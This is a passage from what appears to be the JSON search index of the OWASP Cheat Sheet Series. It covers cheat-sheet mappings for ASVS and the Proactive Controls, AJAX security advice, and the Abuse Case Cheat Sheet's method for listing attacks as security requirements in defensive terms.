Controls"},{"location":"IndexASVS.html#v102-malicious-code-search","text":"None.","title":"V10.2 Malicious Code Search"},{"location":"IndexASVS.html#v103-deployed-application-integrity-controls","text":"Docker Security Cheat Sheet .","title":"V10.3 Deployed Application Integrity Controls"},{"location":"IndexASVS.html#v11-business-logic-verification-requirements","text":"","title":"V11: Business Logic Verification Requirements"},{"location":"IndexASVS.html#v111-business-logic-security-requirements","text":"Abuse Case Cheat Sheet .","title":"V11.1 Business Logic Security Requirements"},{"location":"IndexASVS.html#v12-file-and-resources-verification-requirements","text":"","title":"V12: File and Resources Verification Requirements"},{"location":"IndexASVS.html#v121-file-upload-requirements","text":"Protect File Upload Against Malicious File .","title":"V12.1 File Upload Requirements"},{"location":"IndexASVS.html#v122-file-integrity-requirements","text":"Protect File Upload Against Malicious File . Third Party Javascript Management Cheat Sheet .","title":"V12.2 File Integrity Requirements"},{"location":"IndexASVS.html#v123-file-execution-requirements","text":"None.","title":"V12.3 File execution Requirements"},{"location":"IndexASVS.html#v124-file-storage-requirements","text":"None.","title":"V12.4 File Storage Requirements"},{"location":"IndexASVS.html#v125-file-download-requirements","text":"None.","title":"V12.5 File Download Requirements"},{"location":"IndexASVS.html#v126-ssrf-protection-requirements","text":"Server Side Request Forgery Prevention Cheat Sheet . Unvalidated Redirects and Forwards Cheat Sheet .","title":"V12.6 SSRF Protection Requirements"},{"location":"IndexASVS.html#v13-api-and-web-service-verification-requirements","text":"","title":"V13: API and Web Service Verification Requirements"},{"location":"IndexASVS.html#v131-generic-web-service-security-verification-requirements","text":"Web Service Security Cheat Sheet . Server Side Request Forgery Prevention Cheat Sheet .","title":"V13.1 Generic Web Service Security Verification Requirements"},{"location":"IndexASVS.html#v132-restful-web-service-verification-requirements","text":"REST Assessment Cheat Sheet . REST Security Cheat Sheet . Cross-Site Request Forgery Prevention Cheat Sheet .","title":"V13.2 RESTful Web Service Verification Requirements"},{"location":"IndexASVS.html#v133-soap-web-service-verification-requirements","text":"XML Security Cheat Sheet .","title":"V13.3 SOAP Web Service Verification Requirements"},{"location":"IndexASVS.html#v134-graphql-and-other-web-service-data-layer-security-requirements","text":"None.","title":"V13.4 GraphQL and other Web Service Data Layer Security Requirements"},{"location":"IndexASVS.html#v14-configuration-verification-requirements","text":"","title":"V14: Configuration Verification Requirements"},{"location":"IndexASVS.html#v141-build","text":"Docker Security Cheat Sheet .","title":"V14.1 Build"},{"location":"IndexASVS.html#v142-dependency","text":"Docker Security Cheat Sheet . Vulnerable Dependency Management Cheat Sheet .","title":"V14.2 Dependency"},{"location":"IndexASVS.html#v143-unintended-security-disclosure-requirements","text":"Error Handling Cheat Sheet .","title":"V14.3 Unintended Security Disclosure Requirements"},{"location":"IndexASVS.html#v144-http-security-headers-requirements","text":"Content Security Policy Cheat Sheet .","title":"V14.4 HTTP Security Headers Requirements"},{"location":"IndexASVS.html#v145-validate-http-request-header-requirements","text":"None.","title":"V14.5 Validate HTTP Request Header Requirements"},{"location":"IndexProactiveControls.html","text":"Proactive Controls Index \u00b6 Table of Contents \u00b6 Table of contents Objective 1. Define Security Requirements 2. Leverage Security Frameworks and Libraries 3. Secure Database Access 4. Encode and Escape Data 5. Validate All Inputs 6. Implement Digital Identity 7. Enforce Access Controls 8. Protect Data Everywhere 9. Implement Security Logging and Monitoring 10. Handle All Errors and Exceptions Objective \u00b6 This cheatsheet will help users of the OWASP Proactive Controls identify which cheatsheets map to each proactive controls item. This mapping is based the OWASP Proactive Controls version 3.0 (2018). 1. Define Security Requirements \u00b6 Abuse Case Cheat Sheet Attack Surface Analysis Cheat Sheet Threat Modeling Cheat Sheet 2. Leverage Security Frameworks and Libraries \u00b6 Clickjacking Defense Cheat Sheet DotNet Security Cheat Sheet (A3 Cross Site Scripting) PHP Configuration Cheat Sheet Ruby on Rails Cheatsheet (Tools) Ruby on Rails Cheatsheet (XSS) Vulnerable Dependency Management Cheat Sheet 3. Secure Database Access \u00b6 DotNet Security Cheat Sheet (Data Access) DotNet Security Cheat Sheet (A1 SQL Injection) Query Parameterization Cheat Sheet Ruby on Rails Cheatsheet (SQL Injection) SQL Injection Prevention Cheat Sheet 4. Encode and Escape Data \u00b6 AJAX Security Cheat Sheet (Client Side) Cross Site Scripting Prevention Cheat Sheet DOM based XSS Prevention Cheat Sheet Injection Prevention Cheat Sheet Injection Prevention Cheat Sheet in Java LDAP Injection Prevention Cheat Sheet 5. Validate All Inputs \u00b6 Bean Validation Cheat Sheet Deserialization Cheat Sheet DotNet Security Cheat Sheet (HTTP Validation and Encoding) DotNet Security Cheat Sheet (A8 Cross site request forgery) DotNet Security Cheat Sheet (A10 Unvalidated redirects and forwards) Input Validation Cheat Sheet Injection Prevention Cheat Sheet Injection Prevention Cheat Sheet in Java Mass Assignment Cheat Sheet OS Command Injection Defense Cheat Sheet File Upload Cheat Sheet REST Security Cheat Sheet (Input Validation) Ruby on Rails Cheatsheet (Command Injection) Ruby on Rails Cheatsheet (Mass Assignment and Strong Parameters) Unvalidated Redirects and Forwards Cheat Sheet XML External Entity Prevention Cheat Sheet Server Side Request Forgery Prevention Cheat Sheet 6. Implement Digital Identity \u00b6 Authentication Cheat Sheet Choosing and Using Security Questions Cheat Sheet DotNet Security Cheat Sheet (Forms authentication) DotNet Security Cheat Sheet (A2 Weak Account management) Forgot Password Cheat Sheet JAAS Cheat Sheet JSON Web Token Cheat Sheet for Java Password Storage Cheat Sheet REST Security Cheat Sheet (JWT) Ruby on Rails Cheatsheet (Sessions) Ruby on Rails Cheatsheet (Authentication) SAML Security Cheat Sheet Session Management Cheat Sheet 7. Enforce Access Controls \u00b6 Access Control Cheat Sheet Authorization Testing Automation Credential Stuffing Prevention Cheat Sheet Cross-Site_Request_Forgery_Prevention_Cheat_Sheet DotNet Security Cheat Sheet (A4 Insecure Direct object references) DotNet Security Cheat Sheet (A7 Missing function level access control) REST Security Cheat Sheet (Access Control) Ruby on Rails Cheatsheet (Insecure Direct Object Reference or Forceful Browsing) Ruby on Rails Cheatsheet (CSRF) Insecure Direct Object Reference Prevention Cheat Sheet Transaction Authorization Cheat Sheet 8. Protect Data Everywhere \u00b6 Cryptographic Storage Cheat Sheet DotNet Security Cheat Sheet (Encryption) DotNet Security Cheat Sheet (A6 Sensitive data exposure) TLS Cipher String Cheat Sheet Transport Layer Protection Cheat Sheet Key Management Cheat Sheet HTTP Strict Transport Security Cheat Sheet Pinning Cheat Sheet REST Security Cheat Sheet (HTTPS) Ruby on Rails Cheatsheet (Encryption) User Privacy Protection Cheat Sheet 9. Implement Security Logging and Monitoring \u00b6 REST Security Cheat Sheet (Audit Logs) Logging Cheat Sheet 10. Handle All Errors and Exceptions \u00b6 REST Security Cheat Sheet (Error Handling) Error Handling Cheat Sheet","title":"Index Proactive Controls"},{"location":"IndexProactiveControls.html#proactive-controls-index","text":"","title":"Proactive Controls Index"},{"location":"IndexProactiveControls.html#table-of-contents","text":"Table of contents Objective 1. Define Security Requirements 2. Leverage Security Frameworks and Libraries 3. Secure Database Access 4. Encode and Escape Data 5. Validate All Inputs 6. Implement Digital Identity 7. Enforce Access Controls 8. Protect Data Everywhere 9. Implement Security Logging and Monitoring 10. Handle All Errors and Exceptions","title":"Table of Contents"},{"location":"IndexProactiveControls.html#objective","text":"This cheatsheet will help users of the OWASP Proactive Controls identify which cheatsheets map to each proactive controls item. This mapping is based the OWASP Proactive Controls version 3.0 (2018).","title":"Objective"},{"location":"IndexProactiveControls.html#1-define-security-requirements","text":"Abuse Case Cheat Sheet Attack Surface Analysis Cheat Sheet Threat Modeling Cheat Sheet","title":"1. Define Security Requirements"},{"location":"IndexProactiveControls.html#2-leverage-security-frameworks-and-libraries","text":"Clickjacking Defense Cheat Sheet DotNet Security Cheat Sheet (A3 Cross Site Scripting) PHP Configuration Cheat Sheet Ruby on Rails Cheatsheet (Tools) Ruby on Rails Cheatsheet (XSS) Vulnerable Dependency Management Cheat Sheet","title":"2. Leverage Security Frameworks and Libraries"},{"location":"IndexProactiveControls.html#3-secure-database-access","text":"DotNet Security Cheat Sheet (Data Access) DotNet Security Cheat Sheet (A1 SQL Injection) Query Parameterization Cheat Sheet Ruby on Rails Cheatsheet (SQL Injection) SQL Injection Prevention Cheat Sheet","title":"3. Secure Database Access"},{"location":"IndexProactiveControls.html#4-encode-and-escape-data","text":"AJAX Security Cheat Sheet (Client Side) Cross Site Scripting Prevention Cheat Sheet DOM based XSS Prevention Cheat Sheet Injection Prevention Cheat Sheet Injection Prevention Cheat Sheet in Java LDAP Injection Prevention Cheat Sheet","title":"4. Encode and Escape Data"},{"location":"IndexProactiveControls.html#5-validate-all-inputs","text":"Bean Validation Cheat Sheet Deserialization Cheat Sheet DotNet Security Cheat Sheet (HTTP Validation and Encoding) DotNet Security Cheat Sheet (A8 Cross site request forgery) DotNet Security Cheat Sheet (A10 Unvalidated redirects and forwards) Input Validation Cheat Sheet Injection Prevention Cheat Sheet Injection Prevention Cheat Sheet in Java Mass Assignment Cheat Sheet OS Command Injection Defense Cheat Sheet File Upload Cheat Sheet REST Security Cheat Sheet (Input Validation) Ruby on Rails Cheatsheet (Command Injection) Ruby on Rails Cheatsheet (Mass Assignment and Strong Parameters) Unvalidated Redirects and Forwards Cheat Sheet XML External Entity Prevention Cheat Sheet Server Side Request Forgery Prevention Cheat Sheet","title":"5. Validate All Inputs"},{"location":"IndexProactiveControls.html#6-implement-digital-identity","text":"Authentication Cheat Sheet Choosing and Using Security Questions Cheat Sheet DotNet Security Cheat Sheet (Forms authentication) DotNet Security Cheat Sheet (A2 Weak Account management) Forgot Password Cheat Sheet JAAS Cheat Sheet JSON Web Token Cheat Sheet for Java Password Storage Cheat Sheet REST Security Cheat Sheet (JWT) Ruby on Rails Cheatsheet (Sessions) Ruby on Rails Cheatsheet (Authentication) SAML Security Cheat Sheet Session Management Cheat Sheet","title":"6. Implement Digital Identity"},{"location":"IndexProactiveControls.html#7-enforce-access-controls","text":"Access Control Cheat Sheet Authorization Testing Automation Credential Stuffing Prevention Cheat Sheet Cross-Site_Request_Forgery_Prevention_Cheat_Sheet DotNet Security Cheat Sheet (A4 Insecure Direct object references) DotNet Security Cheat Sheet (A7 Missing function level access control) REST Security Cheat Sheet (Access Control) Ruby on Rails Cheatsheet (Insecure Direct Object Reference or Forceful Browsing) Ruby on Rails Cheatsheet (CSRF) Insecure Direct Object Reference Prevention Cheat Sheet Transaction Authorization Cheat Sheet","title":"7. Enforce Access Controls"},{"location":"IndexProactiveControls.html#8-protect-data-everywhere","text":"Cryptographic Storage Cheat Sheet DotNet Security Cheat Sheet (Encryption) DotNet Security Cheat Sheet (A6 Sensitive data exposure) TLS Cipher String Cheat Sheet Transport Layer Protection Cheat Sheet Key Management Cheat Sheet HTTP Strict Transport Security Cheat Sheet Pinning Cheat Sheet REST Security Cheat Sheet (HTTPS) Ruby on Rails Cheatsheet (Encryption) User Privacy Protection Cheat Sheet","title":"8. Protect Data Everywhere"},{"location":"IndexProactiveControls.html#9-implement-security-logging-and-monitoring","text":"REST Security Cheat Sheet (Audit Logs) Logging Cheat Sheet","title":"9. Implement Security Logging and Monitoring"},{"location":"IndexProactiveControls.html#10-handle-all-errors-and-exceptions","text":"REST Security Cheat Sheet (Error Handling) Error Handling Cheat Sheet","title":"10. Handle All Errors and Exceptions"},{"location":"cheatsheets/AJAX_Security_Cheat_Sheet.html","text":"AJAX Security Cheat Sheet \u00b6 Introduction \u00b6 This document will provide a starting point for AJAX security and will hopefully be updated and expanded reasonably often to provide more detailed information about specific frameworks and technologies. Client Side (JavaScript) \u00b6 Use .innerText instead of .innerHtml \u00b6 The use of .innerText will prevent most XSS problems as it will automatically encode the text. Don't use eval \u00b6 eval() function is evil, never use it. Needing to use eval usually indicates a problem in your design. Canonicalize data to consumer (read: encode before use) \u00b6 When using data to build HTML, script, CSS, XML, JSON, etc. make sure you take into account how that data must be presented in a literal sense to keep its logical meaning. Data should be properly encoded before used in this manner to prevent injection style issues, and to make sure the logical meaning is preserved. Check out the OWASP Java Encoder Project. Don't rely on client logic for security \u00b6 Least ye have forgotten the user controls the client side logic. I can use a number of browser plugging to set breakpoints, skip code, change values, etc. Never rely on client logic. Don't rely on client business logic \u00b6 Just like the security one, make sure any interesting business rules/logic is duplicated on the server side less a user bypass needed logic and do something silly, or worse, costly. Avoid writing serialization code \u00b6 This is hard and even a small mistake can cause large security issues. There are already a lot of frameworks to provide this functionality. Take a look at the JSON page for links. Avoid building XML or JSON dynamically \u00b6 Just like building HTML or SQL you will cause XML injection bugs, so stay way from this or at least use an encoding library or safe JSON or XML library to make attributes and element data safe. XSS (Cross Site Scripting) Prevention SQL Injection Prevention Never transmit secrets to the client \u00b6 Anything the client knows the user will also know, so keep all that secret stuff on the server please. Don't perform encryption in client side code \u00b6 Use TLS/SSL and encrypt on the server! Don't perform security impacting logic on client side \u00b6 This is the overall one that gets me out of trouble in case I missed something :) Server Side \u00b6 Use CSRF Protection \u00b6 Take a look at the Cross-Site Request Forgery (CSRF) Prevention cheat sheet. Protect against JSON Hijacking for Older Browsers \u00b6 Review AngularJS JSON Hijacking Defense Mechanism \u00b6 See the JSON Vulnerability Protection section of the AngularJS documentation. Always return JSON with an Object on the outside \u00b6 Always have the outside primitive be an object for JSON strings: Exploitable: [{ \"object\" : \"inside an array\" }] Not exploitable: { \"object\" : \"not inside an array\" } Also not exploitable: { \"result\" : [{ \"object\" : \"inside an array\" }]} Avoid writing serialization code Server Side \u00b6 Remember ref vs. value types! Look for an existing library that has been reviewed. Services can be called by users directly \u00b6 Even though you only expect your AJAX client side code to call those services the users can too. Make sure you validate inputs and treat them like they are under user control (because they are!). Avoid building XML or JSON by hand, use the framework \u00b6 Use the framework and be safe, do it by hand and have security issues. Use JSON And XML Schema for Webservices \u00b6 You need to use a third-party library to validate web services.","title":"AJAX Security"},{"location":"cheatsheets/AJAX_Security_Cheat_Sheet.html#ajax-security-cheat-sheet","text":"","title":"AJAX Security Cheat Sheet"},{"location":"cheatsheets/AJAX_Security_Cheat_Sheet.html#introduction","text":"This document will provide a starting point for AJAX security and will hopefully be updated and expanded reasonably often to provide more detailed information about specific frameworks and technologies.","title":"Introduction"},{"location":"cheatsheets/AJAX_Security_Cheat_Sheet.html#client-side-javascript","text":"","title":"Client Side (JavaScript)"},{"location":"cheatsheets/AJAX_Security_Cheat_Sheet.html#use-innertext-instead-of-innerhtml","text":"The use of .innerText will prevent most XSS problems as it will automatically encode the text.","title":"Use .innerText instead of .innerHtml"},{"location":"cheatsheets/AJAX_Security_Cheat_Sheet.html#dont-use-eval","text":"eval() function is evil, never use it. Needing to use eval usually indicates a problem in your design.","title":"Don't use eval"},{"location":"cheatsheets/AJAX_Security_Cheat_Sheet.html#canonicalize-data-to-consumer-read-encode-before-use","text":"When using data to build HTML, script, CSS, XML, JSON, etc. make sure you take into account how that data must be presented in a literal sense to keep its logical meaning. Data should be properly encoded before used in this manner to prevent injection style issues, and to make sure the logical meaning is preserved. Check out the OWASP Java Encoder Project.","title":"Canonicalize data to consumer (read: encode before use)"},{"location":"cheatsheets/AJAX_Security_Cheat_Sheet.html#dont-rely-on-client-logic-for-security","text":"Least ye have forgotten the user controls the client side logic. I can use a number of browser plugging to set breakpoints, skip code, change values, etc. Never rely on client logic.","title":"Don't rely on client logic for security"},{"location":"cheatsheets/AJAX_Security_Cheat_Sheet.html#dont-rely-on-client-business-logic","text":"Just like the security one, make sure any interesting business rules/logic is duplicated on the server side less a user bypass needed logic and do something silly, or worse, costly.","title":"Don't rely on client business logic"},{"location":"cheatsheets/AJAX_Security_Cheat_Sheet.html#avoid-writing-serialization-code","text":"This is hard and even a small mistake can cause large security issues. There are already a lot of frameworks to provide this functionality. Take a look at the JSON page for links.","title":"Avoid writing serialization code"},{"location":"cheatsheets/AJAX_Security_Cheat_Sheet.html#avoid-building-xml-or-json-dynamically","text":"Just like building HTML or SQL you will cause XML injection bugs, so stay way from this or at least use an encoding library or safe JSON or XML library to make attributes and element data safe. XSS (Cross Site Scripting) Prevention SQL Injection Prevention","title":"Avoid building XML or JSON dynamically"},{"location":"cheatsheets/AJAX_Security_Cheat_Sheet.html#never-transmit-secrets-to-the-client","text":"Anything the client knows the user will also know, so keep all that secret stuff on the server please.","title":"Never transmit secrets to the client"},{"location":"cheatsheets/AJAX_Security_Cheat_Sheet.html#dont-perform-encryption-in-client-side-code","text":"Use TLS/SSL and encrypt on the server!","title":"Don't perform encryption in client side code"},{"location":"cheatsheets/AJAX_Security_Cheat_Sheet.html#dont-perform-security-impacting-logic-on-client-side","text":"This is the overall one that gets me out of trouble in case I missed something :)","title":"Don't perform security impacting logic on client side"},{"location":"cheatsheets/AJAX_Security_Cheat_Sheet.html#server-side","text":"","title":"Server Side"},{"location":"cheatsheets/AJAX_Security_Cheat_Sheet.html#use-csrf-protection","text":"Take a look at the Cross-Site Request Forgery (CSRF) Prevention cheat sheet.","title":"Use CSRF Protection"},{"location":"cheatsheets/AJAX_Security_Cheat_Sheet.html#protect-against-json-hijacking-for-older-browsers","text":"","title":"Protect against JSON Hijacking for Older Browsers"},{"location":"cheatsheets/AJAX_Security_Cheat_Sheet.html#review-angularjs-json-hijacking-defense-mechanism","text":"See the JSON Vulnerability Protection section of the AngularJS documentation.","title":"Review AngularJS JSON Hijacking Defense Mechanism"},{"location":"cheatsheets/AJAX_Security_Cheat_Sheet.html#always-return-json-with-an-object-on-the-outside","text":"Always have the outside primitive be an object for JSON strings: Exploitable: [{ \"object\" : \"inside an array\" }] Not exploitable: { \"object\" : \"not inside an array\" } Also not exploitable: { \"result\" : [{ \"object\" : \"inside an array\" }]}","title":"Always return JSON with an Object on the outside"},{"location":"cheatsheets/AJAX_Security_Cheat_Sheet.html#avoid-writing-serialization-code-server-side","text":"Remember ref vs. value types! Look for an existing library that has been reviewed.","title":"Avoid writing serialization code Server Side"},{"location":"cheatsheets/AJAX_Security_Cheat_Sheet.html#services-can-be-called-by-users-directly","text":"Even though you only expect your AJAX client side code to call those services the users can too. Make sure you validate inputs and treat them like they are under user control (because they are!).","title":"Services can be called by users directly"},{"location":"cheatsheets/AJAX_Security_Cheat_Sheet.html#avoid-building-xml-or-json-by-hand-use-the-framework","text":"Use the framework and be safe, do it by hand and have security issues.","title":"Avoid building XML or JSON by hand, use the framework"},{"location":"cheatsheets/AJAX_Security_Cheat_Sheet.html#use-json-and-xml-schema-for-webservices","text":"You need to use a third-party library to validate web services.","title":"Use JSON And XML Schema for Webservices"},{"location":"cheatsheets/Abuse_Case_Cheat_Sheet.html","text":"Abuse Case Cheat Sheet \u00b6 Introduction \u00b6 Often when the security level of an application is mentioned in requirements, the following expressions are met: The application must be secure . The application must defend against all attacks targeting this category of application . The application must defend against attacks from the OWASP TOP 10 ... These security requirements are too generic, and thus useless for a development team... In order to build a secure application, from a pragmatic point of view, it is important to identify the attacks which the application must defend against, according to its business and technical context. Objective \u00b6 The objective of this cheat sheet is to provide an explanation of about what an Abuse Case is, why abuse cases are important when considering the security of an application, and further finally, to provide a proposal for a pragmatic approach to building a list of abuse cases and tracking them for every feature planned for implementation as part of an application. The cheat sheet may be used for this purpose regardless of the project methodology used (waterfall or agile). Important note about this Cheat Sheet: The main objective is to provide a pragmatic approach in order to allow a company or a project team to start building and handling the list of abuse cases and then customize the elements proposed to its context/culture in order to, finally, build its own method. This cheat sheet can be seen as a getting-started tutorial. Context & approach \u00b6 Why clearly identify the attacks \u00b6 Clearly identifying the attacks against which the application must defend is essential in order to enable the following steps in a project or sprint: Evaluate the business risk for each of the identified attacks in order perform a selection according to the business risk and the project/sprint budget. Derive security requirements and add them into the project specification or sprint's user stories and acceptance criteria. Estimate the overhead of provision in the initial project/sprint charge that will be necessary to implement the countermeasures. About countermeasures: Allow the project team to define them, and to determine in which location they are appropriate (network, infrastructure, code...) to be located. Notion of Abuse Case \u00b6 In order to help build the list of attacks, the notion of Abuse Cases is helpful. An Abuse Case can be defined as: A way to use a feature that was not expected by the implementer, allowing an attacker to influence the feature or outcome of use of the feature based on the attacker action (or input). Synopsys define an Abuse Case like this: Misuse and abuse cases describe how users misuse or exploit the weaknesses of controls in software features to attack an application. This can lead to tangible business impact when a direct attack against business functionalities, which may bring in revenue or provide positive user experience, are attacked. Abuse cases can also be an effective way to drive security requirements that lead to proper protection of these critical business use cases. Synopsys source How to define the list of Abuse Cases \u00b6 There are many different ways to define the list of abuse cases for a feature (that can be mapped to a user story in agile projects). The project OWASP Open SAMM proposes the following approach in the Activity A of the Security Practice Threat Assessment for the Maturity level 2: Further considering the threats to the organization, conduct a more formal analysis to determine potential misuse or abuse of functionality. Typically, this process begins with identification of normal usage scenarios, e.g. use-case diagrams if available. If a formal abuse-case technique isn't used, generate a set of abuse-cases for each scenario by starting with a statement of normal usage and brainstorming ways in which the statement might be negated, in whole or in part. The simplest way to get started is to insert the word \"no\" or \"not\" into the usage statement in as many ways as possible, typically around nouns and verbs. Each usage scenario should generate several possible abuse-case statements. Further elaborate the abuse-case statements to include any application-specific concerns based on the business function of the software. The ultimate goal is for the completed set of abuse statements to form a model for usage patterns that should be disallowed by the software. If desired, these abuse cases can be combined with existing threat models. After initial creation, abuse-case models should be updated for active projects during the design phase. For existing projects, new requirements should be analyzed for potential abuse, and existing projects should opportunistically build abuse-cases for established functionality where practical. Open SAMM source: Threat Assessment Level 2 Activity A Another way to achieve the building of the list can be the following (more bottom-up and collaboratively oriented): Make a workshop that includes people with the following profiles: Business analyst : Will be the business key people that will describe each feature from a business point of view. Risk analyst : Will be the company's risk personnel that will evaluate the business risk from a proposed attack (sometimes it is the Business analyst depending on the company). Penetration tester : Will be the attacker that will propose attacks that they can perform on the business feature(s) in question. If the company does not have a person with this profile then it is possible to request the service of an external specialist. If possible, include 2 penetration testers with different backgrounds in order to increase the number of possible attacks that will be identified and considered. Technical leaders of the projects : Will be the project technical people and will allow technical exchange about attacks and countermeasures identified during the workshop. Quality assurance analyst or functional tester : Personnel that may have a good sense of how the application/functionality is intended to work (positive testing), not work (negative testing), and what things cause it to fail (failure cases). During this workshop (duration will depend on the size of the feature list, but 4 hours is a good start) all business features that will be part of the project or the sprint will be processed. The output of the workshop will be a list of attacks (abuse cases) for all business features. All abuse cases will have a risk rating that allows for filtering and prioritization. It is important to take into account Technical and Business kind of abuse cases and mark them accordingly. Example: Technical flagged abuse case: Add Cross Site Scripting injection into a comment input field. Business flagged abuse case: Ability to modify arbitrary the price of an article in an online shop prior to pass an order causing the user to pay a lower amount for the wanted article. When to define the list of Abuse Cases \u00b6 On agile project, the definition workshop must be made after the meeting in which User Stories are included in a Sprint. In waterfall projects, the definition workshop must be made when the business feature to implements are identified and known by the business. Whatever the mode of project used (agile or waterfall), the abuse cases selected to be addressed must become security requirements in each feature specification section (waterfall) or User Story acceptance criteria (agile) in order to allow additional cost/effort evaluation, identification and implementation of the countermeasures. Each abuse case must have a unique identifier in order to allow tracking throughout the whole project/sprint (details about this point will be given in the proposal section). An example of unique ID format can be ABUSE_CASE_001 . The following figure provides an overview of the chaining of the different steps involved (from left to right): Proposal \u00b6 The proposal will focus on the output of the workshop explained in the previous section. Step 1: Preparation of the workshop \u00b6 First, even if it seems obvious, the key business people must be sure to know, understand and be able to explain the business features that will be processed during the workshop. Secondly, create a new Microsoft Excel file (you can also use Google Sheets or any other similar software) with the following sheets (or tabs): FEATURES Will contain a table with the list of business features planned for the workshop. ABUSE CASES Will contain a table with all abuse cases identified during the workshop. COUNTERMEASURES Will contain a table with the list of possible countermeasures (light description) imagined for the abuse cases identified. This sheet is not mandatory, but it can be useful (for an abuse case to know), if a fix is easy to implement and then can impact the risk rating. Countermeasures can be identified by the AppSec profile during the workshop, because an AppSec person must be able to perform attacks but also to build or identify defenses (it is not always the case for the Pentester profile because this person's focus is generally on the attack side only, so, the combination Pentester + AppSec is very efficient to have a 360 degree view). This is the representation of each sheet along with an example of content that will be filled during the workshop: FEATURES sheet: Feature unique ID Feature name Feature short description FEATURE_001 DocumentUploadFeature Allow user to upload document along a message COUNTERMEASURES sheet: Countermeasure unique ID Countermeasure short description Countermeasure help/hint DEFENSE_001 Validate the uploaded file by loading it into a parser Use advice from the OWASP Cheat Sheet about file upload ABUSE CASES sheet: Abuse case unique ID Feature ID impacted Abuse case's attack description Attack referential ID (if applicable) CVSS V3 risk rating (score) CVSS V3 string Kind of abuse case Countermeasure ID applicable Handling decision (To Address or Risk Accepted) ABUSE_CASE_001 FEATURE_001 Upload Office file with malicious macro in charge of dropping a malware CAPEC-17 HIGH (7.7) CVSS:3.0/AV:N/AC:H/PR:L/UI:R/S:C/C:N/I:H/A:H Technical DEFENSE_001 To Address Step 2: During the workshop \u00b6 Use the spreadsheet to review all the features. For each feature, follow this flow: Key business people explain the current feature from a business point of view. Penetration testers propose and explain a set of attacks that they can perform against the feature. For each attack proposed: Appsec proposes a countermeasure and a preferred set up location (infrastructure, network, code, design...). Technical people give feedback about the feasibility of the proposed countermeasure. Penetration testers use the CVSS v3 (or other standard) calculator to determine a risk rating. (ex: CVSS V3 calculator ) Risk key people accept/increase/decrease the rating to have final one that match the real business impact for the company. Business, Risk and Technical key peoples find a consensus and filter the list of abuses for the current feature to keep the ones that must be addressed, and then flag them accordingly in the ABUSE CASES sheet ( if risk is accepted then add a comment to explain why ). Pass to next feature... If the presence of penetration testers is not possible then you can use the following references to identify the applicable attacks on your features: OWASP Automated Threats to Web Applications OWASP Testing Guide OWASP Mobile Testing Guide Common Attack Pattern Enumeration and Classification (CAPEC) Important note on attacks and countermeasure knowledge base(s): With the time and across projects, you will obtain your own dictionary of attacks and countermeasures that are applicable to the kind of application in your business domain. This dictionary will speed up the future workshops in a significant way. To promote the creation of this dictionary, you can, at the end of the project/sprint, gather the list of attacks and countermeasures identified in a central location (wiki, database, file...) that will be used during the next workshop in combination with input from penetration pesters. Step 3: After the workshop \u00b6 The spreadsheet contains (at this stage) the list of all abuse cases that must be handled and, potentially (depending on the capacity) corresponding countermeasures. Now, there are two remaining task: Key business people must update the specification of each feature (waterfall) or the User Story of each feature (agile) to include the associated abuse cases as Security Requirements (waterfall) or Acceptance Criteria (agile). Key technical people must evaluate the overhead in terms of charge/effort to take into account the countermeasure. Step 4: During implementation - Abuse cases handling tracking \u00b6 In order to track the handling of all the abuse cases, the following approach can be used: If one or several abuse cases are handled at: Design, Infrastructure or Network level Make a note in the documentation or schema to indicate that This design/network/infrastructure takes into account the abuse cases ABUSE_CASE_001, ABUSE_CASE_002, ABUSE_CASE_xxx . Code level Put a special comment in the classes/scripts/modules to indicate that This class/module/script takes into account the abuse cases ABUSE_CASE_001, ABUSE_CASE_002, ABUSE_CASE_xxx . Dedicated annotation like @AbuseCase(ids={\"ABUSE_CASE_001\",\"ABUSE_CASE_002\"}) can be used to facilitate tracking and allow identification into integrated development environment. Using this way, it becomes possible (via some minor scripting) to identify where abuse cases are addressed. Step 5: During implementation - Abuse cases handling validation \u00b6 As abuse cases are defined, it is possible to put in place automated or manual validations to ensure that: All the selected abuse cases are handled. An abuse case is correctly/completely handled. Validations can be of the following kinds: Automated (run regularly at commit, daily or weekly in the Continuous Integration Jobs of the project): Custom audit rules in Static Application Security Testing (SAST) or Dynamic Application Security Testing (DAST) tools. Dedicated unit, integration or functional security oriented tests. ... Manual: Security code review between project's peers during the design or implementation. Provide the list of all abuse cases addressed to pentesters so that they may validate the protection efficiency for each abuse case during an intrusion test against the application (the pentester will validate that the attacks identified are no longer effective and will also try to find other possible attacks). ... Adding automated tests also allow teams to track that countermeasures against the abuse cases are still effective/in place during a maintenance or bug fixing phase of a project (to prevent accidental removal/disabling). It is also useful when a Continuous Delivery approach is used, to ensure that all abuse cases protections are in place before opening access to the application. Example of derivation of Abuse Cases as User Stories \u00b6 The following section show an example of derivation of Abuse Cases as User Stories, here using the OWASP TOP 10 as input source. Threat Oriented Personas: Malicious User Abusive User Unknowing User A1:2017-Injection \u00b6 Epic: Almost any source of data can be an injection vector, environment variables, parameters, external and internal web services, and all types of users. Injection flaws occur when an attacker can send hostile data to an interpreter. Abuse Case: As an attacker, I will perform an injection attack (SQL, LDAP, XPath, or NoSQL queries, OS commands, XML parsers, SMTP headers, expression languages, and ORM queries) against input fields of the User or API interfaces A2:2017-Broken Authentication \u00b6 Epic: Attackers have access to hundreds of millions of valid username and password combinations for credential stuffing, default administrative account lists, automated brute force, and dictionary attack tools. Session management attacks are well understood, particularly in relation to unexpired session tokens. Abuse Case: As an attacker, I have access to hundreds of millions of valid username and password combinations for credential stuffing. Abuse Case: As an attacker, I have default administrative account lists, automated brute force, and dictionary attack tools I use against login areas of the application and support systems. Abuse Case: As an attacker, I manipulate session tokens using expired and fake tokens to gain access. A3:2017-Sensitive Data Exposure \u00b6 Epic: Rather than directly attacking crypto, attackers steal keys, execute man-in-the-middle attacks, or steal clear text data off the server, while in transit, or from the user's client, e.g. browser. A manual attack is generally required. Previously retrieved password databases could be brute forced by Graphics Processing Units (GPUs). Abuse Case: As an attacker, I steal keys that were exposed in the application to get unauthorized access to the application or system. Abuse Case: As an attacker, I execute man-in-the-middle attacks to get access to traffic and leverage it to obtain sensitive data and possibly get unauthorized access to the application. Abuse Case: As an attacker, I steal clear text data off the server, while in transit, or from the user's client, e.g. browser to get unauthorized access to the application or system. Abuse Case: As an attacker, I find and target old or weak cryptographic algorithms by capturing traffic and breaking the encryption. A4:2017-XML External Entities (XXE) \u00b6 Epic: Attackers can exploit vulnerable XML processors if they can upload XML or include hostile content in an XML document, exploiting vulnerable code, dependencies or integrations. Abuse Case: As an attacker, I exploit vulnerable areas of the application where the user or system can upload XML to extract data, execute a remote request from the server, scan internal systems, perform a denial-of-service attack, as well as execute other attacks. Abuse Case: As an attacker, I include hostile content in an XML document which is uploaded to the application or system to extract data, execute a remote request 